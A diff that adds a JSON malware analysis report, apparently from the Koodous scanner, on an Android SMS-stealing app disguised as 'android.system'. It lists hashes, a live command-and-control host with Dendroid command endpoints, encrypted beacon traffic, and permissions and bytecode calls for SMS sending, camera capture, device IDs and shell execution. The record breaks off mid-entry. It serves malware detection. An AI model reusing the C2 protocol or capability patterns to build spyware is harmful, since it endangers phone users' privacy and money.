@@ -1,0 +1,863 @@
+{
+    "apk_info": {
+        "id": "AE5b1p8Qe7j1yxJQ",
+        "url": "https://developer.koodous.com/apks/d866f152780f8ed62f3a3e2c73aabc12e726768fcdf375521586bdef37ecd6bc/",
+        "sha256": "d866f152780f8ed62f3a3e2c73aabc12e726768fcdf375521586bdef37ecd6bc",
+        "md5": "ece5f4628600bcaec8ceda8c63b03bfc",
+        "sha1": "e104339eac2a930aa0a4ccf549e0f49f32779aae",
+        "app": "android.system",
+        "package_name": "com.android.system.manager",
+        "company": "Android",
+        "version": "1.5.7.3",
+        "image": "https://developer.koodous.com/media/apk_images/11/cf/11cf7be3879cf4cebc6396ba7bac96d8117a28bfe45b159a6aedae9187a594c5",
+        "size": 238554,
+        "tags": [
+            "sms-thief"
+        ],
+        "is_trusted": false,
+        "is_installed": false,
+        "rating": -3,
+        "is_detected": true,
+        "is_corrupted": false,
+        "last_scan": null,
+        "is_static_analyzed": true,
+        "is_dynamic_analyzed": true,
+        "is_false_positive": false,
+        "last_yara_analysis_at": null,
+        "matches_count": 15,
+        "comments_count": 1,
+        "votes_count": 3,
+        "created_at": "2018-10-17T18:56:21+02:00",
+        "updated_at": "2023-03-30T16:55:28.171402+02:00"
+    },
+    "static_analysis": {
+        "cuckoo": {
+            "target": {
+                "file": {
+                    "md5": "ece5f4628600bcaec8ceda8c63b03bfc",
+                    "sha1": "e104339eac2a930aa0a4ccf549e0f49f32779aae",
+                    "size": 238554,
+                    "crc32": "23AD5AE9",
+                    "sha256": "d866f152780f8ed62f3a3e2c73aabc12e726768fcdf375521586bdef37ecd6bc",
+                    "sha512": "6bdddbd1c28435d99856c44f44fa79fc07debec062c2392074952eba488fd871fd4c3cafcf43192dfe733dd500d45a31a592456248bc350060469543813979b6",
+                    "ssdeep": "3072:zozoTgEKgDY+K6X7ys/6sdNWVlvU+376GIucVKbUqWQX1NICFrjQY7q2x3ww9:sec+K3GBdGlv8GIBKbUqWQsErjd3w8"
+                },
+                "category": "file"
+            },
+            "network": {
+                "dns": [
+                    {
+                        "type": "A",
+                        "answers": [],
+                        "request": "s2.upupdate.cn"
+                    },
+                    {
+                        "type": "A",
+                        "answers": [
+                            {
+                                "data": "150.129.82.138",
+                                "type": "A"
+                            }
+                        ],
+                        "request": "s2.upupdate.cn"
+                    }
+                ],
+                "irc": [],
+                "http": [
+                    {
+                        "uri": "http://s2.upupdate.cn:8088/Dendroid/datacipher/getRsaKey",
+                        "body": "",
+                        "data": "GET /Dendroid/datacipher/getRsaKey HTTP/1.1\r\nHost: s2.upupdate.cn:8088\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nUser-Agent: okhttp/3.9.1\r\n\r\n",
+                        "host": "s2.upupdate.cn:8088",
+                        "path": "/Dendroid/datacipher/getRsaKey",
+                        "port": 8088,
+                        "method": "GET",
+                        "version": "1.1",
+                        "user-agent": "okhttp/3.9.1"
+                    },
+                    {
+                        "uri": "http://s2.upupdate.cn:8088/Dendroid/commandManager/getCommand",
+                        "body": "f0acfceb57e19b2e49d0775972692325bfbffebdef0ddbb4c89a42e370fe865739f0745a74af70c060a018328d28bce53de918ad8bb0d5b7837a6b6f3b19fba8630bf23defd3bd90df443362dda8cbdd14cc83b6935e887ae74b110f679802e280dd70fe0b0462f5dee0458e2ba3d37978606119da0e1ca97cf89fc73d94292ede9b58a1418a82bd7bbc5c354d4a7ad8ea07ab858198bf075322ad011a7a99cd66d041abe61d065c4fb75dd69138946a0c57d3e0a2d714d30fd59615497b82a7905c6b0aa84ecd250ee62e1b67f7a191b086bb738ca62b23d0bea0273308e7cec332a2c560ccb59d9bffd95740efc870578cb479d1f7ed87d20e",
+                        "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 03c3226e5a9c79aac1544d8683782ee3ef5347ef34696c4da5c75eea3006520d53120f0fcb217dd8133c7e65afe719a97a0ac695b44867a2aad372f78304b82a12f0c1ce8fee3c5f981282886b483129db6fb5f7ee8b2e313eb2cd167d65b06c79064c6832927f84ac62914d4b2d93064b81c71abc67437981fb0032065d180ef1fd993915dc746b249d4c49f61838654bb6592e840467d9b736d118e6f800cec263afb7b01a129f5f1138c57cbb84a68b521797950bd5acedb278b77180980ba1cf67f4109b304a5501c3d08f3fb766e86e702f382467b95a8a630746a0f60ded3ec40b6c96318699fa4ec28a1167c8b471a600a9f6103b7ac543e355eb4161\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\nf0acfceb57e19b2e49d0775972692325bfbffebdef0ddbb4c89a42e370fe865739f0745a74af70c060a018328d28bce53de918ad8bb0d5b7837a6b6f3b19fba8630bf23defd3bd90df443362dda8cbdd14cc83b6935e887ae74b110f679802e280dd70fe0b0462f5dee0458e2ba3d37978606119da0e1ca97cf89fc73d94292ede9b58a1418a82bd7bbc5c354d4a7ad8ea07ab858198bf075322ad011a7a99cd66d041abe61d065c4fb75dd69138946a0c57d3e0a2d714d30fd59615497b82a7905c6b0aa84ecd250ee62e1b67f7a191b086bb738ca62b23d0bea0273308e7cec332a2c560ccb59d9bffd95740efc870578cb479d1f7ed87d20e",
+                        "host": "s2.upupdate.cn:8088",
+                        "path": "/Dendroid/commandManager/getCommand",
+                        "port": 8088,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://s2.upupdate.cn:8088/Dendroid/commandManager/getCommand",
+                        "body": "313bcd170d24ecb8e8e5f7dcdebb56e40ba55fa9f56fc20ab898dd591526c13d71c7ecfae4a7a2dcbb160ddd5b0111ed2243a3f5eaddfce3b51be3eff92c9ddb97663b4d0da73a09e65cd5af9cf2641e2a48904fa08fedd4f80fac4a8cdd48d0c557eedf6eeb0fb75f31f1aed43588688cef5e25d203f9f7eebf8efaafa3f2ff8868c23260346ff088f55cf6621bada072949b82b40773dcf6f370212c5de0f9772680f537e4210711251353c9811317e3de5f4b78866b8b355d76c781aec91786575f1653f3915764bdf90d7c230ad55c2b57c875c4a7b493c42ba040618ef32c2780d60f5e6ef698cca1897d0d46998009008b8749efab919f",
+                        "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 5c995b68d025281cfef5bd924bd1244c58cd2b2e1369e3271280305a79fe922d48f90044ba23e57112d833f5e37be1301d38f1d0ea6a512dd3e3abc7f0bf69d1d3faf3e6efc35dca8be8d735281e366fd3c091d5b61add3840ff454a20f28a3662a84228b9203d95f5f7691bc3bae4d842779d72966341317ff8cede9b02dd2720d332c205fc8c003f06a6b5788cbaa7f44116c2bfb42156e93f3bf7327f6e2418c1e2638b0784600d4ec85ce99364c98b4d628546dc228bb03afb05028c9c737a0fcf37b7e2e4cc915e1d065f750c78ea929a045eee0c8dc304df4137096e19c824c2f0441ae9025dfa3c95d036f10e512e6d73cafb01769f2d45c39d64cee0\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n313bcd170d24ecb8e8e5f7dcdebb56e40ba55fa9f56fc20ab898dd591526c13d71c7ecfae4a7a2dcbb160ddd5b0111ed2243a3f5eaddfce3b51be3eff92c9ddb97663b4d0da73a09e65cd5af9cf2641e2a48904fa08fedd4f80fac4a8cdd48d0c557eedf6eeb0fb75f31f1aed43588688cef5e25d203f9f7eebf8efaafa3f2ff8868c23260346ff088f55cf6621bada072949b82b40773dcf6f370212c5de0f9772680f537e4210711251353c9811317e3de5f4b78866b8b355d76c781aec91786575f1653f3915764bdf90d7c230ad55c2b57c875c4a7b493c42ba040618ef32c2780d60f5e6ef698cca1897d0d46998009008b8749efab919f",
+                        "host": "s2.upupdate.cn:8088",
+                        "path": "/Dendroid/commandManager/getCommand",
+                        "port": 8088,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://s2.upupdate.cn:8088/Dendroid/commandManager/getCommand",
+                        "body": "ad7d33938646eb50d5605bb6e960a4dff654d5552f5acb8387ad5bebbb8c48306df561e480cce25a20b345601e7f4affe9d361d90ce547b83b890950745d68f58adc4e22ef3acf98db604a59c0496701d4a737561254998890654a12fefd6b0701c2b649e1b3cc0b4fe7edbb236b499844e9d37ab82afd42254de61464255371333cdfdbeb4f82e41b6f45378fbf201dd922074d938f86c372f758387e120ae175984700c1153c355fd3a13c359c7ce3a7b1006d2d0bae3914aa2edbc34ab71c601b362e006ccf42248588b18e752e44547a5d8541d58e7d5a1779e9c5bfc65ad8e67c476943ea648feb5746e1d41251156f9c85e1180df647f7",
+                        "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 4e6931359d6b14b3de1ac4537d0e2b8c60d2a691285d369fed4946d7d5e425117ffe3d0946b8d5d21507eb2a7b6968d1d90652f1428b729c9bc5a04f936b047e343670f4cabe73b575e74738b074bf1c09755bc81e771d7db3e01d512d3d7fdf373f50c5e1300a56183f2f714f3d08ebdba43b498a96898f51b88bb0a41dc65f5679abea9f5d2a441e40b8726c5c6d417064e2b5d1e6a76fc7b961794bffae9a2f31823c188b5a2edfec35451c9729d5f9fc2f0001245dbea885e8e2ac2ab68b9a4065d90436c6a5417efa7b6cbb16f7ccb6559f0f5723f890a9ae68db4261a8a47251959adf0ca8a4b15988b1c5e695d6ebc1300f4036ba5fd7737fdd250788\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\nad7d33938646eb50d5605bb6e960a4dff654d5552f5acb8387ad5bebbb8c48306df561e480cce25a20b345601e7f4affe9d361d90ce547b83b890950745d68f58adc4e22ef3acf98db604a59c0496701d4a737561254998890654a12fefd6b0701c2b649e1b3cc0b4fe7edbb236b499844e9d37ab82afd42254de61464255371333cdfdbeb4f82e41b6f45378fbf201dd922074d938f86c372f758387e120ae175984700c1153c355fd3a13c359c7ce3a7b1006d2d0bae3914aa2edbc34ab71c601b362e006ccf42248588b18e752e44547a5d8541d58e7d5a1779e9c5bfc65ad8e67c476943ea648feb5746e1d41251156f9c85e1180df647f7",
+                        "host": "s2.upupdate.cn:8088",
+                        "path": "/Dendroid/commandManager/getCommand",
+                        "port": 8088,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://s2.upupdate.cn:8088/Dendroid/commandManager/getCommand",
+                        "body": "417e6a46f8a1dbc98d4e07197d89f7d636653818bba44d601dc494297117bb1fd05ef7249d6e7d1748cde814f3b58954d543d41c790207dc0b3d524f284de156f0f584ee086f3a8f1a2b736d81c4211efe550818191a2bb56b78b994e76800e7049df0df512d3f395d1c8e13a772a4062bf9637a3a20f13500993d36eb575fa8e3d53178bef47332416e2c91d9b5c7d2e82df06f0e45efe97b73bd96616d86fc6bae08a9be1077379c8c68c4eb72529019d64a8c827e7de33eaf1424fe9f98f7126591724c5b9d16815e417fa4dd5dbdd91c57883c135b4707fe48e5fe250d9c7ded4dae06081771373c37fda7610458b6b8235576f6c2f23d1a",
+                        "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 8a9dc91a26b36e6456c207698fd04f5ce0dabc5f57c27f08f1861996b6d00eeb67319e1438b20cd4e3fb1058dda520c65a7b37f8dbb23924abeaa667f72758a0fd15b6e0877606acc7e9014bfa755e5e31722bc0c9b242c293b00072edffa574326bcfe00c5226a3216cd6cb9efc94b8bea57aa10da820d01915dcbe0def946aec7fbae1a2d907890e80df85448d495938f3c09dbec9ea12737db434ad130be19de5e11eaecef0d318dcd7fd8bae0d3f37a974cb1c9e4d4688ed87a99bd23fb5855a25da7ae4424aa5f53e48b8fe483f41799523627bff736b7cc59a2cbb8e7311cd6e4da27b082d241b498ad2aba97b7128d4d86e2f8cd8ae50da362530edc8\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n417e6a46f8a1dbc98d4e07197d89f7d636653818bba44d601dc494297117bb1fd05ef7249d6e7d1748cde814f3b58954d543d41c790207dc0b3d524f284de156f0f584ee086f3a8f1a2b736d81c4211efe550818191a2bb56b78b994e76800e7049df0df512d3f395d1c8e13a772a4062bf9637a3a20f13500993d36eb575fa8e3d53178bef47332416e2c91d9b5c7d2e82df06f0e45efe97b73bd96616d86fc6bae08a9be1077379c8c68c4eb72529019d64a8c827e7de33eaf1424fe9f98f7126591724c5b9d16815e417fa4dd5dbdd91c57883c135b4707fe48e5fe250d9c7ded4dae06081771373c37fda7610458b6b8235576f6c2f23d1a",
+                        "host": "s2.upupdate.cn:8088",
+                        "path": "/Dendroid/commandManager/getCommand",
+                        "port": 8088,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://s2.upupdate.cn:8088/Dendroid/commandManager/getCommand",
+                        "body": "77cded10fe4445ae2a97739650502fdc3a7aedb2f69b0615684288dba3aeb91dbe1d3f913e2df278096f5ff57a7a2997beee2709953a2a47199f792821f062961b3b7985f4a447906999f99a8a3f80c1a8ed2b4a94e526eece599039666aec62544bd3d7bde2567320d566599364074515447326bad643c19b82e9915923ec7d635e6a96fa39a8fb18e7696ff5ca27af8f895ae5bcd8f1b4416c1f4c0f958ac462de553f0736a5c645db9721f5fbdc1aaaa6d5141f6b7870a3637065fda576b695c79ada2f68ea0c719c6f617e56fc953b5f0dd287a62cd22be21b0bec679e01a38575ff2df1504bd1dcfd88f4eaff73fafafb5084435941d50a",
+                        "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 8629b08348b4b594372d8cb7c91727374f111111458e715cd42ae0efc80ca1ce9dc6302bb3e7840d6857a1385a804b96c93ceb02d3eb6bcc95db91538aaec43fa99a6d8772b0fa3e4909f6f9325662cfe12426552c5ff4e29712359e9246eb84db0df9d9c3fa389c855acabd549c7605bb8fa9c7836f191802e9f7172d5373a50786af90cd78b60f11ed76080d492418bee8af54ea7985256dbac8d07abe184f9bf4533b05cd9255bd00690d1bfb736de852f210e7cfa2268752dea21ffca9fa2567d4e5fcb1cb0ec6eba351434a9fcc1f81968e9fc9c12cd60d5ea3d13ebdbe9dde82cd0c6fa94a8d87ac27a0d60d13ccb83cff3724b576ef0955f711eb4bca\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n77cded10fe4445ae2a97739650502fdc3a7aedb2f69b0615684288dba3aeb91dbe1d3f913e2df278096f5ff57a7a2997beee2709953a2a47199f792821f062961b3b7985f4a447906999f99a8a3f80c1a8ed2b4a94e526eece599039666aec62544bd3d7bde2567320d566599364074515447326bad643c19b82e9915923ec7d635e6a96fa39a8fb18e7696ff5ca27af8f895ae5bcd8f1b4416c1f4c0f958ac462de553f0736a5c645db9721f5fbdc1aaaa6d5141f6b7870a3637065fda576b695c79ada2f68ea0c719c6f617e56fc953b5f0dd287a62cd22be21b0bec679e01a38575ff2df1504bd1dcfd88f4eaff73fafafb5084435941d50a",
+                        "host": "s2.upupdate.cn:8088",
+                        "path": "/Dendroid/commandManager/getCommand",
+                        "port": 8088,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    }
+                ],
+                "smtp": [],
+                "hosts": [
+                    "150.129.82.138"
+                ],
+                "domains": [
+                    {
+                        "ip": "150.129.82.138",
+                        "domain": "s2.upupdate.cn"
+                    }
+                ]
+            }
+        },
+        "androguard": {
+            "urls": [
+                "http://loc.map.baidu.com/sdk.php",
+                "http://s2.upupdate.cn:8088/Dendroid"
+            ],
+            "dexes": {
+                "classes": {
+                    "sha256": "920f3edf8993c27323cbc2b8a38d58154fa7bd44789ec68de33bd0d72b26cbe4",
+                    "ssdeep": "6144:DA5MyAo2NZDpBgP+DIk34lZrlp2tP4G+pmUHr:Ep+Iv54+7r"
+                }
+            },
+            "api_key": {
+                "com::baidu::lbsapi::API_KEY": "PCPUrNuqjnFXoRBYGoU1Dp6MOvSqVSnG"
+            },
+            "cordova": "",
+            "filters": [
+                "android.intent.action.PHONE_STATE",
+                "android.app.action.DEVICE_ADMIN_ENABLED",
+                "android.intent.action.MAIN",
+                "android.intent.action.BOOT_COMPLETED"
+            ],
+            "app_name": "android.system",
+            "services": [
+                "com.android.system.manager.service.AliveJobService",
+                "com.android.system.manager.RobMoneyService",
+                "com.android.system.manager.BaseNotificationListener",
+                "com.baidu.location.f"
+            ],
+            "wearable": false,
+            "androidtv": false,
+            "libraries": [],
+            "providers": [],
+            "receivers": [
+                "com.android.system.manager.receiver.PhoneListener",
+                "com.android.system.manager.BootBroadcastReceiver",
+                "com.android.system.manager.receiver.MyDeviceAdminReceiver"
+            ],
+            "activities": [
+                "com.android.system.manager.MainActivity",
+                "com.android.system.manager.activity.Camera2Activity",
+                "com.android.system.manager.MyCameraActivity",
+                "com.android.system.manager.TsetActivity",
+                "com.android.system.manager.activity.MyCameraActivity"
+            ],
+            "certificate": {
+                "sha1": "61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81",
+                "serial": "936EACBE07F201DF",
+                "issuerDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_after": "Jul 17 01:33:46 2035 GMT",
+                "subjectDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_before": "Feb 29 01:33:46 2008 GMT"
+            },
+            "permissions": [
+                "android.permission.ACCESS_FINE_LOCATION",
+                "android.permission.RECEIVE_SMS",
+                "android.permission.READ_EXTERNAL_STORAGE",
+                "android.permission.RECEIVE_BOOT_COMPLETED",
+                "android.permission.INTERNET",
+                "android.permission.SEND_SMS",
+                "android.permission.ACCESS_WIFI_STATE",
+                "android.permission.PROCESS_OUTGOING_CALLS",
+                "android.permission.CAMERA",
+                "android.permission.WRITE_SMS",
+                "android.permission.WAKE_LOCK",
+                "android.permission.READ_CALL_LOG",
+                "android.permission.CHANGE_WIFI_STATE",
+                "android.permission.ACCESS_NETWORK_STATE",
+                "android.permission.READ_PHONE_STATE",
+                "com.android.browser.permission.READ_HISTORY_BOOKMARKS",
+                "android.permission.RECORD_AUDIO",
+                "android.permission.ACCESS_COARSE_LOCATION",
+                "android.permission.WRITE_EXTERNAL_STORAGE",
+                "android.permission.READ_CONTACTS",
+                "android.permission.READ_SMS"
+            ],
+            "package_name": "com.android.system.manager",
+            "version_code": "1",
+            "main_activity": "com.android.system.manager.TsetActivity",
+            "signature_name": "META-INF/CERT.RSA",
+            "functionalities": {
+                "SMS": [
+                    {
+                        "code": "invoke-virtual/range v0 ... v5, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Landroid/app/PendingIntent; Landroid/app/PendingIntent;)V",
+                        "class": "Lcom/android/system/manager/BaseNotificationListener;",
+                        "method": "a"
+                    }
+                ],
+                "mcc": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "c"
+                    }
+                ],
+                "ssl": [
+                    {
+                        "code": "const-string v5, 'https'",
+                        "class": "La/a/e/d;",
+                        "method": "<clinit>"
+                    },
+                    {
+                        "code": "const-string v1, 'https'",
+                        "class": "La/a;",
+                        "method": "<init>"
+                    },
+                    {
+                        "code": "const-string v3, 'https'",
+                        "class": "La/a;",
+                        "method": "<init>"
+                    }
+                ],
+                "imei": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/BaseNotificationListener;",
+                        "method": "onStartCommand"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "f"
+                    }
+                ],
+                "imsi": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "b"
+                    }
+                ],
+                "camera": [
+                    {
+                        "code": "invoke-virtual v0, v1, v2, v3, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback; Landroid/hardware/Camera$PictureCallback; Landroid/hardware/Camera$PictureCallback;)V",
+                        "class": "Lcom/android/system/manager/MyCameraActivity;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v2, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V",
+                        "class": "Lcom/android/system/manager/MyCameraActivity;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/hardware/Camera;->startPreview()V",
+                        "class": "Lcom/android/system/manager/MyCameraActivity;",
+                        "method": "a"
+                    }
+                ],
+                "crypto": [
+                    {
+                        "code": "invoke-virtual v0, v1, Ljava/security/MessageDigest;->digest([B)[B",
+                        "class": "Lb/f;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Ljava/security/MessageDigest;->digest()[B",
+                        "class": "Lcom/android/system/manager/a/x;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Ljava/security/MessageDigest;->digest()[B",
+                        "class": "Lcom/android/system/manager/tools/c;",
+                        "method": "a"
+                    }
+                ],
+                "socket": [
+                    {
+                        "code": "invoke-virtual v2, v0, Ljava/net/DatagramSocket;->send(Ljava/net/DatagramPacket;)V",
+                        "class": "Lcom/android/system/manager/bean/encoder/f;",
+                        "method": "run"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;",
+                        "class": "Lcom/android/system/manager/tools/PostRequest;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v1, v2, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener; I)V",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "c"
+                    }
+                ],
+                "runbinary": [
+                    {
+                        "code": "invoke-static Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;",
+                        "class": "Lcom/android/system/manager/BaseNotificationListener;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v3, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;",
+                        "class": "Lcom/android/system/manager/BaseNotificationListener;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-static Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;",
+                        "class": "Lcom/android/system/manager/MainActivity;",
+                        "method": "c"
+                    }
+                ],
+                "phonenumber": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/android/system/manager/e/a;",
+                        "method": "a"
+                    }
+                ],
+                "dynamicbroadcastreceiver": [
+                    {
+                        "code": "invoke-virtual v7, v0, v1, Lcom/android/system/manager/BaseNotificationListener;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Lcom/android/system/manager/BaseNotificationListener;",
+                        "method": "onStartCommand"
+                    },
+                    {
+                        "code": "invoke-virtual v2, v1, v0, Lcom/android/system/manager/RobMoneyService;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Lcom/android/system/manager/RobMoneyService;",
+                        "method": "onCreate"
+                    },
+                    {
+                        "code": "invoke-virtual v2, v0, Lcom/android/system/manager/RobMoneyService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V",
+                        "class": "Lcom/android/system/manager/RobMoneyService;",
+                        "method": "onUnbind"
+                    }
+                ]
+            },
+            "max_sdk_version": "",
+            "min_sdk_version": 16,
+            "new_permissions": [],
+            "displayed_version": "1.5.7.3",
+            "target_sdk_version": 22
+        }
+    },
+    "dynamic_analysis": {
+        "droidbox": {
+            "dns": [
+                {
+                    "ip": "150.129.82.138",
+                    "hostname": "s2.upupdate.cn"
+                }
+            ],
+            "recvnet": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nstatus: success\r\nContent-Length: 74\r\nDate: Wed, 17 Oct 2018 07:41:27 GMT\r\n\r\nf0ace1f0",
+                    "time": 11.594519,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nstatus: success\r\nContent-Length: 74\r\nDate: Wed, 17 Oct 2018 07:42:12 GMT\r\n\r\n77cdf00b",
+                    "time": 55.766805,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705522928,
+                    "data": "dabad386d602104e24c8b089dc56d4c4790d3682151af58a74c4bb3df1bfdc06f8",
+                    "time": 44.916983,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nstatus: success\r\nContent-Length: 74\r\nDate: Wed, 17 Oct 2018 07:42:01 GMT\r\n\r\n417e775d",
+                    "time": 44.898827,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705522928,
+                    "data": "75fa9361129c600e2b28647a59a5f3b927c71d90c523b6045c9977cf4b88f806a5",
+                    "time": 11.693323,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705522928,
+                    "data": "2f3fe4f7b3a9e08b87fa11bbad75cb4263e46ee1be07b1c5ace7b35c909c32680e",
+                    "time": 22.778264,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705802416,
